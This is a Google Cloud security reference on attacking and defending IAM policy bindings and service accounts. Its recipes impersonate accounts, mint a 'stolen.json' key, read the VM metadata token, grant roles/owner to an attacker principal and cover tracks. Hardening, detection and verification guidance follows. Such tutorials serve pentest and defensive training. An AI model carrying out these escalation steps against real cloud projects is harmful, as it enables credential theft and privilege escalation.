# IAM and Service Account Attacks

Google Cloud Platform security reference: how IAM policy bindings and service account credentials become the primary attack surface in GCP, and how to abuse or defend them.

## 1. Overview

GCP IAM is a policy-based authorization system. Every API call is checked against a union of policies attached to the resource, its project, its folder, and its organization. The two objects that matter to an attacker are:

- **Policy bindings** - `role` -> `members` at a resource scope. A member can be a user, a group, a domain, or a service account.
- **Service accounts** - non-human identities. They can have IAM bindings (like a user), can be impersonated (`iam.serviceAccounts.actAs`), and can hold long-lived JSON keys.

Most real-world GCP escalations are one of three patterns:

1. An identity (often a service account) has a role that is broader than intended (`roles/editor`, `roles/owner`, or a predefined admin role).
2. An attacker obtains a service account key or token and impersonates that identity.
3. An attacker finds a permission that allows privilege escalation (`iam.serviceAccounts.actAs`, `iam.serviceAccounts.getAccessToken`, `iam.roles.update`, `resourcemanager.projects.setIamPolicy`).

## 2. Reconnaissance and Enumeration

### 2.1 Enumerate who you are and what you can do

With any credential (user, service account, or metadata token):

```bash
gcloud auth list
gcloud config list
gcloud projects list
gcloud iam service-accounts list --project=<PROJECT_ID>
```

To find your own effective permissions on a project:

```bash
gcloud projects get-iam-policy <PROJECT_ID> --flatten="bindings[].members" --filter="bindings.members:$(gcloud config get-value account 2>/dev/null)" --format="table(bindings.role)"
```

Expected output (trimmed):

```text
ROLE
roles/iam.serviceAccountTokenCreator
roles/storage.objectViewer
```

`roles/iam.serviceAccountTokenCreator` is a red flag: it allows minting tokens for other service accounts.

### 2.2 Enumerate the organization hierarchy

```bash
gcloud organizations list
gcloud resource-manager folders list --organization=<ORG_ID>
gcloud projects list --format="table(projectId,parent.id,parent.type)"
```

An IAM binding at the org or folder scope applies to every project underneath. Most enumeration stops at project scope, so a binding at the org level is easy to miss.

### 2.3 Enumerate service accounts and their keys

```bash
gcloud iam service-accounts list --project=<PROJECT_ID>
gcloud iam service-accounts keys list --iam-account=<SA_EMAIL>
```

A service account with multiple active user-managed keys is a smell: keys are meant to be rotated, and each key is a credential that lives until explicitly deleted.

### 2.4 Enumerate IAM roles

```bash
gcloud iam roles list --project=<PROJECT_ID>
gcloud iam roles describe <ROLE_ID> --project=<PROJECT_ID>
```

Custom roles are project-scoped and often over-permissive. A custom role with `iam.serviceAccounts.actAs` and `compute.instances.create` is a direct path to escalation.

## 3. Common Attack Vectors

| Vector | Required permission | Result |
|--------|---------------------|--------|
| Impersonate a service account | `iam.serviceAccounts.actAs` or `iam.serviceAccounts.getAccessToken` | Full identity of the target SA, including its IAM bindings |
| Create a new SA key | `iam.serviceAccountKeys.create` | Persistent credential for an existing SA |
| Attach a privileged SA to a VM | `compute.instances.setServiceAccount` + `iam.serviceAccounts.actAs` | Code running as that SA on a new or existing VM |
| Bind an over-permissive role | `resourcemanager.projects.setIamPolicy` | Grant roles/owner to attacker principal |
| Update an existing custom role | `iam.roles.update` | Add permissions to a role already bound to a target principal |
| Deploy a Cloud Function with a SA | `cloudfunctions.functions.create` + `iam.serviceAccounts.actAs` | Code running as the SA on every invocation |

The most common privilege-escalation permission is `iam.serviceAccounts.actAs`. It is often granted to CI/CD service accounts, and it is sufficient to become any service account in the project.

## 4. Exploitation Recipes

### 4.1 Impersonate a service account

If you have `iam.serviceAccounts.actAs` on a target SA, you can call APIs as that SA without ever holding its key:

```bash
gcloud config set auth/impersonate_service_account <TARGET_SA_EMAIL>
gcloud projects list
gcloud compute instances list --project=<PROJECT_ID>
```

To generate a short-lived access token for direct API calls:

```bash
curl -s -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

To generate an ID token (for Cloud Run, Cloud Functions, or IAP-protected services):

```bash
curl -s -H "Authorization: Bearer $(gcloud auth print-identity-token --audiences=https://target.run.app)" \
  "https://target.run.app"
```

### 4.2 Create a service account key

If you have `iam.serviceAccountKeys.create` on a target SA:

```bash
gcloud iam service-accounts keys create stolen.json --iam-account=<TARGET_SA_EMAIL>
gcloud auth activate-service-account --key-file=stolen.json
gcloud projects list
```

Expected output (trimmed):

```text
created key [abc123def456] of type [json] as [stolen.json] for [<TARGET_SA_EMAIL>]
Activated service account credentials for: [<TARGET_SA_EMAIL>]
```

The new key is a long-lived credential that survives password resets and MFA changes on any human identity. It is only invalidated by deleting the key or disabling the SA.

### 4.3 Attach a privileged service account to a VM

If you have `compute.instances.setServiceAccount` and `iam.serviceAccounts.actAs` on a privileged SA:

```bash
gcloud compute instances set-service-account <VM_NAME> \
  --service-account=<PRIVILEGED_SA_EMAIL> \
  --scopes=cloud-platform \
  --zone=<ZONE>
```

Then SSH into the VM (or use a startup script) and read the metadata token:

```bash
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

Expected output (trimmed):

```text
{"access_token":"ya29.c.xxxxx","expires_in":3599,"token_type":"Bearer"}
```

This is the same escalation primitive as attaching a role to the SA, but it leaves fewer IAM-log entries in some logging configurations.

### 4.4 Bind an over-permissive role

If you have `resourcemanager.projects.setIamPolicy`:

```bash
gcloud projects add-iam-policy-binding <PROJECT_ID> \
  --member="user:attacker@example.com" \
  --role="roles/owner"
```

This is noisy (SetIamPolicy is always logged) but decisive: `roles/owner` grants full control of the project, including the ability to remove the binding later or create new admin identities.

## 5. Post-Exploitation

Once you hold a privileged service account identity, the usual goals are:

- **Persistence** - create a new service account with `roles/owner`, create a new key on an existing SA, or bind a role to an attacker-controlled Google account.
- **Lateral movement** - if the SA has roles at the folder or org level, list projects and repeat the escalation in each.
- **Data access** - read Cloud Storage, Secret Manager, BigQuery, Cloud SQL.
- **Cover tracks** - delete keys you created, delete bindings you added, delete custom roles you modified. All of these are logged, but detection is often delayed.

The cleanest persistence path is a new service account with `roles/owner`, a new user-managed key on that account, and no other changes to the existing IAM policy. Existing monitoring often looks at changes to existing SAs, not at the creation of new privileged SAs.

## 6. Preventive Controls

- **Eliminate service account keys** - use Workload Identity Federation for external workloads, and Workload Identity for GKE workloads. JSON keys are the primary credential-theft vector.
- **Do not grant `roles/editor` or `roles/owner` to service accounts** - use predefined roles scoped to a specific service, or custom roles with the exact permissions needed.
- **Disable the default Compute Engine and App Engine service accounts** - create dedicated SAs per workload and attach them explicitly.
- **Organization policy `constraints/iam.disableServiceAccountKeyCreation`** - blocks key creation across the org. Allow exceptions only for specific projects that genuinely need keys.
- **Organization policy `constraints/iam.allowedPolicyMemberDomains`** - restricts IAM bindings to identities in your Workspace domain. Blocks binding to `gmail.com` accounts.
- **Enforce `iam.serviceAccounts.actAs` carefully** - audit every binding. This is the single most abused permission in GCP.
- **Apply separation of duties** - a CI/CD SA should be able to deploy, but should not be able to modify IAM policy on its own project.
- **VPC Service Controls** - wrap sensitive projects in a perimeter, so a stolen SA token cannot exfiltrate data outside it.

## 7. Detection Controls

- **Admin Activity logs** - always on. Watch for:
  * `google.iam.admin.v1.CreateServiceAccountKey`
  * `google.iam.admin.v1.CreateServiceAccount`
  * `SetIamPolicy`
  * `google.iam.admin.v1.UpdateRole`
  * `compute.instances.setServiceAccount`
- **Alerting on new keys** - any `CreateServiceAccountKey` on a production SA should page. This is a high-fidelity signal.
- **Alerting on new privileged identities** - a new SA or user with `roles/owner` or `roles/editor` should page.
- **Alerting on `SetIamPolicy`** - especially when the change adds an external principal (a user outside your domain, or a service account in a different project).
- **Anomalous SA activity** - a SA that normally calls `storage.objects.get` suddenly calling `iam.serviceAccounts.keys.create` is compromised.
- **`iam.serviceAccounts.actAs` abuse** - log `GenerateAccessToken` and `GenerateIdToken` calls and correlate with the caller. A human user impersonating an SA they never used before is suspicious.
- **Cloud Audit Logs sink** - export Admin Activity to a separate project and a BigQuery dataset with long retention. An attacker with project-owner rights can delete logs in the same project.

## 8. Verification

To verify that the controls are in place in a project:

```bash
# 1. No service accounts with editor or owner
gcloud projects get-iam-policy <PROJECT_ID> \
  --flatten="bindings[].members" \
  --filter="bindings.role=roles/editor OR bindings.role=roles/owner" \
  --format="table(bindings.role,bindings.members)"

# 2. No user-managed keys on production SAs
for sa in $(gcloud iam service-accounts list --project=<PROJECT_ID> --format="value(email)"); do
  keys=$(gcloud iam service-accounts keys list --iam-account=$sa --format="value(name)" --managed-by=user 2>/dev/null)
  if [ -n "$keys" ]; then echo "SA $sa has user-managed keys: $keys"; fi
done

# 3. Organization policies in effect
gcloud resource-manager org-policies describe constraints/iam.disableServiceAccountKeyCreation --project=<PROJECT_ID>
gcloud resource-manager org-policies describe constraints/iam.allowedPolicyMemberDomains --project=<PROJECT_ID>

# 4. Audit log sink exists and is in a separate project
gcloud logging sinks list --project=<PROJECT_ID>
```

Expected: no output from step 1 (or only known exceptions), no user-managed keys on production SAs, both org policies enforced, at least one sink pointing to a separate project.

## 9. Cloud-Specific Considerations

- **Service account impersonation vs keys** - impersonation (`actAs`) is short-lived (1 hour) and logged on every use. Keys are long-lived and only logged at creation. From a defender's view, impersonation is preferable because it produces an audit trail; from an attacker's view, keys are preferable because they leave fewer traces.
- **Cross-project SA binding** - a project can bind a service account from another project to one of its resources. This is common in shared-services architectures and is easy to miss during a project-scoped review.
- **Domain-wide delegation** - a service account in a Workspace domain can be granted the ability to impersonate any user in the domain. This is extremely powerful and must be tightly controlled at the Workspace admin layer.
- **Workload Identity Federation** - external identities (GitHub Actions, AWS IAM, Azure AD) can be mapped to a GCP service account without a key. This is the recommended replacement for JSON keys, but a misconfigured trust policy (any GitHub repo in the org) is itself an escalation vector.
- **Access tokens vs ID tokens** - access tokens authorize GCP API calls. ID tokens authenticate to Cloud Run, Cloud Functions, and IAP. Mixing them up causes confusing 401s during a pentest.

## 10. Production Notes

- Audit `iam.serviceAccounts.actAs` bindings quarterly. Every one is a potential escalation path.
- Treat the CI/CD service account as a privileged identity. It usually has `iam.serviceAccounts.actAs` and `compute.instances.create`, which together are enough to become any SA in the project.
- Never store service account JSON keys in CI secrets. Use Workload Identity Federation instead.
- Rotate any key older than 90 days, then delete it. Set a calendar reminder; there is no built-in auto-rotation in GCP.
- Monitor for `iam.serviceAccounts.actAs` grants outside of Terraform. Manual changes are a common source of over-permissive bindings.
- Use VPC Service Controls to limit the blast radius of a stolen token. Even a valid `roles/owner` identity cannot exfiltrate data outside the perimeter.

## 11. References

- Google Cloud IAM overview - https://cloud.google.com/iam/docs/overview
- Google Cloud service accounts - https://cloud.google.com/iam/docs/service-accounts
- Service account impersonation - https://cloud.google.com/iam/docs/impersonating-service-accounts
- Workload Identity Federation - https://cloud.google.com/iam/docs/workload-identity-federation
- Organization policy constraints - https://cloud.google.com/resource-manager/docs/organization-policy/org-policy-constraints
- Google Cloud audit logs - https://cloud.google.com/logging/docs/audit

## Certification Alignment

- **Google Cloud Professional Cloud Security Engineer** - IAM policy design, least privilege, service account hardening, audit logging.
- **Google Cloud Associate Cloud Engineer** - service accounts, gcloud auth, project-level bindings.
- **Google Cloud Professional Cloud Architect** - organization and folder policy design, cross-project bindings.
- **CompTIA Security+** - identity and access management, least privilege, credential management.
